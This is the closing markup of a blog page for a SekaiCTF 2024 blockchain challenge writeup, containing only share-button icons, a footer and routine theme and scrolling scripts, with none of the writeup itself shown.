1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share SekaiCTF 2024 writeup: Blockchain/ZOO on telegram" href="https://telegram.me/share/url?text=SekaiCTF%202024%20writeup%3a%20Blockchain%2fZOO&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-25-sekaictf-zoo%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share SekaiCTF 2024 writeup: Blockchain/ZOO on ycombinator" href="https://news.ycombinator.com/submitlink?t=SekaiCTF%202024%20writeup%3a%20Blockchain%2fZOO&u=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-25-sekaictf-zoo%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>Blog do GRIS</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>